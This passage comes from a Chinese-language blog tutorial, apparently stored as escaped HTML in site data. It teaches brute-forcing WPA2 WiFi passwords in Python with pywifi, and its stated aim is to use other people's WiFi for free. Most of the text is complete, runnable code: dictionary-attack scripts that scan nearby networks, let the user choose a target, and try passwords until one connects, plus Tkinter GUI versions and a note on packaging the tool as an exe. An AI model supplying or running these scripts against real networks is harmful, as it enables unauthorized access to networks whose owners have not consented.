14))</span><br><span class=\"line\">entry.grid(row=0, column=1)</span><br><span class=\"line\"># 列表控件</span><br><span class=\"line\">text = Listbox(root, font=(&#x27;微软雅黑&#x27;, 14), width=40, height=10)</span><br><span class=\"line\">text.grid(row=1, columnspan=2)</span><br><span class=\"line\"># 按钮</span><br><span class=\"line\">button = Button(root, text=&#x27;开始破解&#x27;, width=20, height=2, command=readPwd)</span><br><span class=\"line\">button.grid(row=2, columnspan=2)</span><br><span class=\"line\"># 显示窗口</span><br><span class=\"line\">root.mainloop()</span><br></pre></td></tr></table></figure>\n\n<p>脚本运行效果：<br><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/4.png\"></p>\n<h2 id=\"UI升级版\"><a href=\"#UI升级版\" class=\"headerlink\" title=\"UI升级版\"></a><strong>UI升级版</strong></h2><p>以上图形界面未允许选择密码字典，下面进行优化升级：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">from tkinter import *</span><br><span class=\"line\">from tkinter import ttk</span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\">import time</span><br><span class=\"line\">import tkinter.filedialog  # 在Gui中打开文件浏览</span><br><span class=\"line\">import tkinter.messagebox  # 打开tkiner的消息提醒框</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class MY_GUI():</span><br><span class=\"line\">    def __init__(self, init_window_name):</span><br><span class=\"line\">        self.init_window_name = init_window_name</span><br><span class=\"line\">        # 密码文件路径</span><br><span class=\"line\">        self.get_value = StringVar()  # 设置可变内容</span><br><span class=\"line\">        # 获取破解wifi账号</span><br><span class=\"line\">        self.get_wifi_value = StringVar()</span><br><span class=\"line\">        # 获取wifi密码</span><br><span class=\"line\">        self.get_wifimm_value = StringVar()</span><br><span class=\"line\">        # 抓取网卡接口</span><br><span class=\"line\">        self.wifi = pywifi.PyWiFi()</span><br><span class=\"line\">        # 抓取第一个无线网卡</span><br><span class=\"line\">        self.iface = self.wifi.interfaces()[0]</span><br><span class=\"line\">        # 测试链接断开所有链接</span><br><span class=\"line\">        self.iface.disconnect()</span><br><span class=\"line\">        time.sleep(1)  # 休眠1秒</span><br><span class=\"line\">        # 测试网卡是否属于断开状态</span><br><span class=\"line\">        assert self.iface.status() in \\</span><br><span class=\"line\">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        # 自动会调用的函数，返回自身的网卡</span><br><span class=\"line\">        return &#x27;(WIFI:%s,%s)&#x27; % (self.wifi, self.iface.name())</span><br><span class=\"line\"></span><br><span class=\"line\">    # 设置窗口</span><br><span class=\"line\">    def set_init_window(self):</span><br><span class=\"line\">        self.init_window_name.title(&quot;WIFI破解工具&quot;)</span><br><span class=\"line\">        self.init_window_name.geometry(&#x27;+500+200&#x27;)</span><br><span class=\"line\">        labelframe = LabelFrame(width=400, height=200, text=&quot;配置&quot;)  # 框架，以下对象都是对于labelframe中添加的</span><br><span class=\"line\">        labelframe.grid(column=0, row=0, padx=10, pady=10)</span><br><span class=\"line\">        self.search = Button(labelframe, text=&quot;搜索附近WiFi&quot;, command=self.scans_wifi_list).grid(column=0, row=0)</span><br><span class=\"line\">        self.pojie = Button(labelframe, text=&quot;开始破解&quot;, command=self.readPassWord).grid(column=1, row=0)</span><br><span class=\"line\">        self.label = Label(labelframe, text=&quot;目录路径：&quot;).grid(column=0, row=1)</span><br><span class=\"line\">        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)</span><br><span class=\"line\">        self.file = Button(labelframe, text=&quot;添加密码文件目录&quot;, command=self.add_mm_file).grid(column=2, row=1)</span><br><span class=\"line\">        self.wifi_text = Label(labelframe, text=&quot;WiFi账号：&quot;).grid(column=0, row=2)</span><br><span class=\"line\">        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)</span><br><span class=\"line\">        self.wifi_mm_text = Label(labelframe, text=&quot;WiFi密码：&quot;).grid(column=2, row=2)</span><br><span class=\"line\">        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W)</span><br><span class=\"line\">        self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)</span><br><span class=\"line\">        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)</span><br><span class=\"line\">        # 定义树形结构与滚动条</span><br><span class=\"line\">        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=&quot;headings&quot;, columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))</span><br><span class=\"line\">        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)</span><br><span class=\"line\">        self.wifi_tree.configure(yscrollcommand=self.vbar.set)</span><br><span class=\"line\">        # 表格的标题</span><br><span class=\"line\">        self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)</span><br><span class=\"line\">        self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)</span><br><span class=\"line\">        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)</span><br><span class=\"line\">        self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;, self.onDBClick)</span><br><span class=\"line\">        self.vbar.grid(row=4, column=1, sticky=NS)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 搜索wifi</span><br><span class=\"line\">    def scans_wifi_list(self):  # 扫描周围wifi列表</span><br><span class=\"line\">        # 开始扫描</span><br><span class=\"line\">        print(&quot;^_^ 开始扫描附近wifi...&quot;)</span><br><span class=\"line\">        self.iface.scan()</span><br><span class=\"line\">        time.sleep(15)</span><br><span class=\"line\">        # 在若干秒后获取扫描结果</span><br><span class=\"line\">        scanres = self.iface.scan_results()</span><br><span class=\"line\">        # 统计附近被发现的热点数量</span><br><span class=\"line\">        nums = len(scanres)</span><br><span class=\"line\">        print(&quot;数量: %s&quot; % (nums))</span><br><span class=\"line\">        # 实际数据</span><br><span class=\"line\">        self.show_scans_wifi_list(scanres)</span><br><span class=\"line\">        return scanres</span><br><span class=\"line\"></span><br><span class=\"line\">    # 显示wifi列表</span><br><span class=\"line\">    def show_scans_wifi_list(self, scans_res):</span><br><span class=\"line\">        for index, wifi_info in enumerate(scans_res):</span><br><span class=\"line\">            self.wifi_tree.insert(&quot;&quot;, &#x27;end&#x27;, values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))</span><br><span class=\"line\"></span><br><span class=\"line\">    # 添加密码文件目录</span><br><span class=\"line\">    def add_mm_file(self):</span><br><span class=\"line\">        self.filename = tkinter.filedialog.askopenfilename()</span><br><span class=\"line\">        self.get_value.set(self.filename)</span><br><span class=\"line\"></span><br><span class=\"line\">    # Treeview绑定事件</span><br><span class=\"line\">    def onDBClick(self, event):</span><br><span class=\"line\">        self.sels = event.widget.selection()</span><br><span class=\"line\">        self.get_wifi_value.set(self.wifi_tree.item(self.sels, &quot;values&quot;)[1])</span><br><span class=\"line\"></span><br><span class=\"line\">    # 读取密码字典，进行匹配</span><br><span class=\"line\">    def readPassWord(self):</span><br><span class=\"line\">        self.getFilePath = self.get_value.get()</span><br><span class=\"line\">        self.get_wifissid = self.get_wifi_value.get()</span><br><span class=\"line\">        pwdfilehander = open(self.getFilePath, &quot;r&quot;, errors=&quot;ignore&quot;)</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                self.pwdStr = pwdfilehander.readline()</span><br><span class=\"line\">                if not self.pwdStr:</span><br><span class=\"line\">                    break</span><br><span class=\"line\">                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)</span><br><span class=\"line\">                if self.bool1:</span><br><span class=\"line\">                    self.res = &quot;[*] 密码正确！wifi名：%s，匹配密码：%s &quot; % (self.get_wifissid, self.pwdStr)</span><br><span class=\"line\">                    self.get_wifimm_value.set(self.pwdStr)</span><br><span class=\"line\">                    tkinter.messagebox.showinfo(&#x27;提示&#x27;, &#x27;破解成功！！！&#x27;)</span><br><span class=\"line\">                    print(self.res)</span><br><span class=\"line\">                    break</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    self.res = &quot;[*] 密码错误！wifi名:%s，匹配密码：%s&quot; % (self.get_wifissid, self.pwdStr)</span><br><span class=\"line\">                    print(self.res)</span><br><span class=\"line\">                time.sleep(3)</span><br><span class=\"line\">            except:</span><br><span class=\"line\">                continue</span><br><span class=\"line\"></span><br><span class=\"line\">    # 对wifi和密码进行匹配</span><br><span class=\"line\">    def connect(self, pwd_Str, wifi_ssid):</span><br><span class=\"line\">        # 创建wifi链接文件</span><br><span class=\"line\">        self.profile = pywifi.Profile()</span><br><span class=\"line\">        self.profile.ssid = wifi_ssid  # wifi名称</span><br><span class=\"line\">        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放</span><br><span class=\"line\">        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法</span><br><span class=\"line\">        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元</span><br><span class=\"line\">        self.profile.key = pwd_Str  # 密码</span><br><span class=\"line\">        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件</span><br><span class=\"line\">        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件</span><br><span class=\"line\">        self.iface.connect(self.tmp_profile)  # 链接</span><br><span class=\"line\">        time.sleep(5)</span><br><span class=\"line\">        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上</span><br><span class=\"line\">            isOK = True</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            isOK = False</span><br><span class=\"line\">        self.iface.disconnect()  # 断开</span><br><span class=\"line\">        time.sleep(1)</span><br><span class=\"line\">        # 检查断开状态</span><br><span class=\"line\">        assert self.iface.status() in \\</span><br><span class=\"line\">               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]</span><br><span class=\"line\">        return isOK</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def gui_start():</span><br><span class=\"line\">    init_window = Tk()</span><br><span class=\"line\">    ui = MY_GUI(init_window)</span><br><span class=\"line\">    print(ui)</span><br><span class=\"line\">    ui.set_init_window()</span><br><span class=\"line\">    init_window.mainloop()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    gui_start()</span><br></pre></td></tr></table></figure>\n\n<p>脚本运行效果如下：</p>\n<p><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/5.png\"></p>\n<p>以上基于 Python 的 GUI 图形界面开发库 Tkinter，实际上 Python 的 GUI 编程可以借助 PyQt5 来自动生成 UI 代码。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>本文学习了 Python 暴力破解 WIFI 密码的方法、以及 Python GUI 图形化编程的基础使用。所演示的代码的不足在于均没有使用多线程进行 WIFI 连接测试，实际上因为 WIFI 连接测试需要一定的耗时（3-5秒），故使用多线程将能减少暴力破解过程的等待时间。</p>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>本文将记录学习下如何通过 Python 脚本实现 WIFI 密码的暴力破解，从而实现免费蹭网。</p>\n<h3 id=\"无图形界面\"><a href=\"#无图形界面\" class=\"headerlink\" title=\"无图形界面\"></a>无图形界面</h3><p>先来看看没有图形界面版的爆破脚本。</p>\n<h2 id=\"WIFI爆破\"><a href=\"#WIFI爆破\" class=\"headerlink\" title=\"WIFI爆破\"></a><strong>WIFI爆破</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\">import time</span><br><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 测试连接，返回链接结果</span><br><span class=\"line\">def wifiConnect(pwd):</span><br><span class=\"line\">    # 抓取网卡接口</span><br><span class=\"line\">    wifi = pywifi.PyWiFi()</span><br><span class=\"line\">    # 获取第一个无线网卡</span><br><span class=\"line\">    ifaces = wifi.interfaces()[0]</span><br><span class=\"line\">    # 断开所有连接</span><br><span class=\"line\">    ifaces.disconnect()</span><br><span class=\"line\">    time.sleep(1)</span><br><span class=\"line\">    wifistatus = ifaces.status()</span><br><span class=\"line\">    if wifistatus == const.IFACE_DISCONNECTED:</span><br><span class=\"line\">        # 创建WiFi连接文件</span><br><span class=\"line\">        profile = pywifi.Profile()</span><br><span class=\"line\">        # 要连接WiFi的名称</span><br><span class=\"line\">        profile.ssid = &quot;Tr0e&quot;</span><br><span class=\"line\">        # 网卡的开放状态</span><br><span class=\"line\">        profile.auth = const.AUTH_ALG_OPEN</span><br><span class=\"line\">        # wifi加密算法,一般wifi加密算法为wps</span><br><span class=\"line\">        profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class=\"line\">        # 加密单元</span><br><span class=\"line\">        profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class=\"line\">        # 调用密码</span><br><span class=\"line\">        profile.key = pwd</span><br><span class=\"line\">        # 删除所有连接过的wifi文件</span><br><span class=\"line\">        ifaces.remove_all_network_profiles()</span><br><span class=\"line\">        # 设定新的连接文件</span><br><span class=\"line\">        tep_profile = ifaces.add_network_profile(profile)</span><br><span class=\"line\">        ifaces.connect(tep_profile)</span><br><span class=\"line\">        # wifi连接时间</span><br><span class=\"line\">        time.sleep(2)</span><br><span class=\"line\">        if ifaces.status() == const.IFACE_CONNECTED:</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return False</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;已有wifi连接&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 读取密码本</span><br><span class=\"line\">def readPassword():</span><br><span class=\"line\">    success = False</span><br><span class=\"line\">    print(&quot;****************** WIFI破解 ******************&quot;)</span><br><span class=\"line\">    # 密码本路径</span><br><span class=\"line\">    path = &quot;pwd.txt&quot;</span><br><span class=\"line\">    # 打开文件</span><br><span class=\"line\">    file = open(path, &quot;r&quot;)</span><br><span class=\"line\">    start = datetime.datetime.now()</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            pwd = file.readline()</span><br><span class=\"line\">            # 去除密码的末尾换行符</span><br><span class=\"line\">            pwd = pwd.strip(&#x27;\\n&#x27;)</span><br><span class=\"line\">            bool = wifiConnect(pwd)</span><br><span class=\"line\">            if bool:</span><br><span class=\"line\">                print(&quot;[*] 密码已破解：&quot;, pwd)</span><br><span class=\"line\">                print(&quot;[*] WiFi已自动连接！！！&quot;)</span><br><span class=\"line\">                success = True</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                # 跳出当前循环，进行下一次循环</span><br><span class=\"line\">                print(&quot;正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s&quot;%(&quot;Tr0e&quot;,pwd))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            continue</span><br><span class=\"line\">    end = datetime.datetime.now()</span><br><span class=\"line\">    if(success):</span><br><span class=\"line\">        print(&quot;[*] 本次破解WIFI密码一共用了多长时间：&#123;&#125;&quot;.format(end - start))</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！&quot;)</span><br><span class=\"line\">    exit(0)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__==&quot;__main__&quot;:</span><br><span class=\"line\">    readPassword()</span><br></pre></td></tr></table></figure>\n\n<p>代码运行效果：<br><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/1.png\"></p>\n<h2 id=\"脚本优化\"><a href=\"#脚本优化\" class=\"headerlink\" title=\"脚本优化\"></a><strong>脚本优化</strong></h2><p>以上脚本需内嵌 WIFI 名、爆破字典路径，缺少灵活性。下面进行改造优化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">import time</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># WiFi扫描模块</span><br><span class=\"line\">def wifi_scan():</span><br><span class=\"line\">    # 初始化wifi</span><br><span class=\"line\">    wifi = pywifi.PyWiFi()</span><br><span class=\"line\">    # 使用第一个无线网卡</span><br><span class=\"line\">    interface = wifi.interfaces()[0]</span><br><span class=\"line\">    # 开始扫描</span><br><span class=\"line\">    interface.scan()</span><br><span class=\"line\">    for i in range(4):</span><br><span class=\"line\">        time.sleep(1)</span><br><span class=\"line\">        print(&#x27;\\r扫描可用 WiFi 中，请稍后。。。（&#x27; + str(3 - i), end=&#x27;）&#x27;)</span><br><span class=\"line\">    print(&#x27;\\r扫描完成！\\n&#x27; + &#x27;-&#x27; * 38)</span><br><span class=\"line\">    print(&#x27;\\r&#123;:4&#125;&#123;:6&#125;&#123;&#125;&#x27;.format(&#x27;编号&#x27;, &#x27;信号强度&#x27;, &#x27;wifi名&#x27;))</span><br><span class=\"line\">    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象</span><br><span class=\"line\">    bss = interface.scan_results()</span><br><span class=\"line\">    # 存放wifi名的集合</span><br><span class=\"line\">    wifi_name_set = set()</span><br><span class=\"line\">    for w in bss:</span><br><span class=\"line\">        # 解决乱码问题</span><br><span class=\"line\">        wifi_name_and_signal = (100 + w.signal, w.ssid.encode(&#x27;raw_unicode_escape&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class=\"line\">        wifi_name_set.add(wifi_name_and_signal)</span><br><span class=\"line\">    # 存入列表并按信号排序</span><br><span class=\"line\">    wifi_name_list = list(wifi_name_set)</span><br><span class=\"line\">    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)</span><br><span class=\"line\">    num = 0</span><br><span class=\"line\">    # 格式化输出</span><br><span class=\"line\">    while num &lt; len(wifi_name_list):</span><br><span class=\"line\">        print(&#x27;\\r&#123;:&lt;6d&#125;&#123;:&lt;8d&#125;&#123;&#125;&#x27;.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))</span><br><span class=\"line\">        num += 1</span><br><span class=\"line\">    print(&#x27;-&#x27; * 38)</span><br><span class=\"line\">    # 返回wifi列表</span><br><span class=\"line\">    return wifi_name_list</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># WIFI破解模块</span><br><span class=\"line\">def wifi_password_crack(wifi_name):</span><br><span class=\"line\">    # 字典路径</span><br><span class=\"line\">    wifi_dic_path = input(&quot;请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：&quot;)</span><br><span class=\"line\">    with open(wifi_dic_path, &#x27;r&#x27;) as f:</span><br><span class=\"line\">        # 遍历密码</span><br><span class=\"line\">        for pwd in f:</span><br><span class=\"line\">            # 去除密码的末尾换行符</span><br><span class=\"line\">            pwd = pwd.strip(&#x27;\\n&#x27;)</span><br><span class=\"line\">            # 创建wifi对象</span><br><span class=\"line\">            wifi = pywifi.PyWiFi()</span><br><span class=\"line\">            # 创建网卡对象，为第一个wifi网卡</span><br><span class=\"line\">            interface = wifi.interfaces()[0]</span><br><span class=\"line\">            # 断开所有wifi连接</span><br><span class=\"line\">            interface.disconnect()</span><br><span class=\"line\">            # 等待其断开</span><br><span class=\"line\">            while interface.status() == 4:</span><br><span class=\"line\">                # 当其处于连接状态时，利用循环等待其断开</span><br><span class=\"line\">                pass</span><br><span class=\"line\">            # 创建连接文件（对象）</span><br><span class=\"line\">            profile = pywifi.Profile()</span><br><span class=\"line\">            # wifi名称</span><br><span class=\"line\">            profile.ssid = wifi_name</span><br><span class=\"line\">            # 需要认证</span><br><span class=\"line\">            profile.auth = const.AUTH_ALG_OPEN</span><br><span class=\"line\">            # wifi默认加密算法</span><br><span class=\"line\">            profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class=\"line\">            profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class=\"line\">            # wifi密码</span><br><span class=\"line\">            profile.key = pwd</span><br><span class=\"line\">            # 删除所有wifi连接文件</span><br><span class=\"line\">            interface.remove_all_network_profiles()</span><br><span class=\"line\">            # 设置新的wifi连接文件</span><br><span class=\"line\">            tmp_profile = interface.add_network_profile(profile)</span><br><span class=\"line\">            # 开始尝试连接</span><br><span class=\"line\">            interface.connect(tmp_profile)</span><br><span class=\"line\">            start_time = time.time()</span><br><span class=\"line\">            while time.time() - start_time &lt; 1.5:</span><br><span class=\"line\">                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）</span><br><span class=\"line\">                if interface.status() == 4:</span><br><span class=\"line\">                    print(f&#x27;\\r连接成功！密码为：&#123;pwd&#125;&#x27;)</span><br><span class=\"line\">                    exit(0)</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    print(f&#x27;\\r正在利用密码 &#123;pwd&#125; 尝试破解。&#x27;, end=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 主函数</span><br><span class=\"line\">def main():</span><br><span class=\"line\">    # 退出标致</span><br><span class=\"line\">    exit_flag = 0</span><br><span class=\"line\">    # 目标编号</span><br><span class=\"line\">    target_num = -1</span><br><span class=\"line\">    while not exit_flag:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            print(&#x27;WiFi万能钥匙&#x27;.center(35, &#x27;-&#x27;))</span><br><span class=\"line\">            # 调用扫描模块，返回一个排序后的wifi列表</span><br><span class=\"line\">            wifi_list = wifi_scan()</span><br><span class=\"line\">            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理</span><br><span class=\"line\">            choose_exit_flag = 0</span><br><span class=\"line\">            while not choose_exit_flag:</span><br><span class=\"line\">                try:</span><br><span class=\"line\">                    target_num = int(input(&#x27;请选择你要尝试破解的wifi：&#x27;))</span><br><span class=\"line\">                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入</span><br><span class=\"line\">                    if target_num in range(len(wifi_list)):</span><br><span class=\"line\">                        # 二次确认</span><br><span class=\"line\">                        while not choose_exit_flag:</span><br><span class=\"line\">                            try:</span><br><span class=\"line\">                                choose = str(input(f&#x27;你选择要破解的WiFi名称是：&#123;wifi_list[target_num][1]&#125;，确定吗？（Y/N）&#x27;))</span><br><span class=\"line\">                                # 对用户输入进行小写处理，并判断</span><br><span class=\"line\">                                if choose.lower() == &#x27;y&#x27;:</span><br><span class=\"line\">                                    choose_exit_flag = 1</span><br><span class=\"line\">                                elif choose.lower() == &#x27;n&#x27;:</span><br><span class=\"line\">                                    break</span><br><span class=\"line\">                                # 处理用户其它字母输入</span><br><span class=\"line\">                                else:</span><br><span class=\"line\">                                    print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)</span><br><span class=\"line\">                            # 处理用户非字母输入</span><br><span class=\"line\">                            except ValueError:</span><br><span class=\"line\">                                print(&#x27;只能输入 Y/N 哦o(*￣︶￣*)o&#x27;)</span><br><span class=\"line\">                        # 退出破解</span><br><span class=\"line\">                        if choose_exit_flag == 1:</span><br><span class=\"line\">                            break</span><br><span class=\"line\">                        else:</span><br><span class=\"line\">                            print(&#x27;请重新输入哦(*^▽^*)&#x27;)</span><br><span class=\"line\">                except ValueError:</span><br><span class=\"line\">                    print(&#x27;只能输入数字哦o(*￣︶￣*)o&#x27;)</span><br><span class=\"line\">            # 密码破解，传入用户选择的wifi名称</span><br><span class=\"line\">            wifi_password_crack(wifi_list[target_num][1])</span><br><span class=\"line\">            print(&#x27;-&#x27; * 38)</span><br><span class=\"line\">            exit_flag = 1</span><br><span class=\"line\">        except Exception as e:</span><br><span class=\"line\">            print(e)</span><br><span class=\"line\">            raise e</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>脚本运行效果如下：<br><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/2.png\"></p>\n<p>上述代码实现了依据信号强度枚举当前附近的所有 WIFI 名称，并且可供用户自主选择需要暴力破解的 WIFI，同时还可灵活指定暴力破解的字典，相对而言体验感提升了不少。进一步也可以将上述脚本打包生成 exe 文件，双击运行效果如下：</p>\n<p><img src=\"/./2024/07/14/Python%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B%E6%9D%A5%E4%BA%86/3.png\"></p>\n<h3 id=\"图形化界面\"><a href=\"#图形化界面\" class=\"headerlink\" title=\"图形化界面\"></a>图形化界面</h3><p>下面基于 Python 的 GUI 图形界面开发库 Tkinter 优化上述脚本，实现友好的可视化 WIFI 暴力破解界面工具。</p>\n<p>关于 Tkinter 库的语法可参见：</p>\n<p><a href=\"https://www.runoob.com/python/python-gui-tkinter.html\">https://www.runoob.com/python/python-gui-tkinter.html</a></p>\n<h2 id=\"简单版UI\"><a href=\"#简单版UI\" class=\"headerlink\" title=\"简单版UI\"></a><strong>简单版UI</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from tkinter import *</span><br><span class=\"line\">from pywifi import const</span><br><span class=\"line\">import pywifi</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 主要步骤：</span><br><span class=\"line\"># 1、获取第一个无线网卡</span><br><span class=\"line\"># 2、断开所有的wifi</span><br><span class=\"line\"># 3、读取密码本</span><br><span class=\"line\"># 4、设置睡眠时间</span><br><span class=\"line\">def wificonnect(str, wifiname):</span><br><span class=\"line\">    # 窗口无线对象</span><br><span class=\"line\">    wifi = pywifi.PyWiFi()</span><br><span class=\"line\">    # 抓取第一个无线网卡</span><br><span class=\"line\">    ifaces = wifi.interfaces()[0]</span><br><span class=\"line\">    # 断开所有的wifi</span><br><span class=\"line\">    ifaces.disconnect()</span><br><span class=\"line\">    time.sleep(1)</span><br><span class=\"line\">    if ifaces.status() == const.IFACE_DISCONNECTED:</span><br><span class=\"line\">        # 创建wifi连接文件</span><br><span class=\"line\">        profile = pywifi.Profile()</span><br><span class=\"line\">        profile.ssid = wifiname</span><br><span class=\"line\">        # wifi的加密算法</span><br><span class=\"line\">        profile.akm.append(const.AKM_TYPE_WPA2PSK)</span><br><span class=\"line\">        # wifi的密码</span><br><span class=\"line\">        profile.key = str</span><br><span class=\"line\">        # 网卡的开发</span><br><span class=\"line\">        profile.auth = const.AUTH_ALG_OPEN</span><br><span class=\"line\">        # 加密单元,这里需要写点加密单元否则无法连接</span><br><span class=\"line\">        profile.cipher = const.CIPHER_TYPE_CCMP</span><br><span class=\"line\">        # 删除所有的wifi文件</span><br><span class=\"line\">        ifaces.remove_all_network_profiles()</span><br><span class=\"line\">        # 设置新的连接文件</span><br><span class=\"line\">        tep_profile = ifaces.add_network_profile(profile)</span><br><span class=\"line\">        # 连接</span><br><span class=\"line\">        ifaces.connect(tep_profile)</span><br><span class=\"line\">        time.sleep(3)</span><br><span class=\"line\">        if ifaces.status() == const.IFACE_CONNECTED:</span><br><span class=\"line\">            return True</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return False</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def readPwd():</span><br><span class=\"line\">    # 获取wiif名称</span><br><span class=\"line\">    wifiname = entry.get().strip()</span><br><span class=\"line\">    path = r&#x27;./pwd.txt&#x27;</span><br><span class=\"line\">    file = open(path, &#x27;r&#x27;)</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            # 读取</span><br><span class=\"line\">            mystr = file.readline().strip()</span><br><span class=\"line\">            # 测试连接</span><br><span class=\"line\">            bool = wificonnect(mystr, wifiname)</span><br><span class=\"line\">            if bool:</span><br><span class=\"line\">                text.insert(END, &#x27;密码正确&#x27; + mystr)</span><br><span class=\"line\">                text.see(END)</span><br><span class=\"line\">                text.update()</span><br><span class=\"line\">                file.close()</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                text.insert(END, &#x27;密码错误&#x27; + mystr)</span><br><span class=\"line\">                text.see(END)</span><br><span 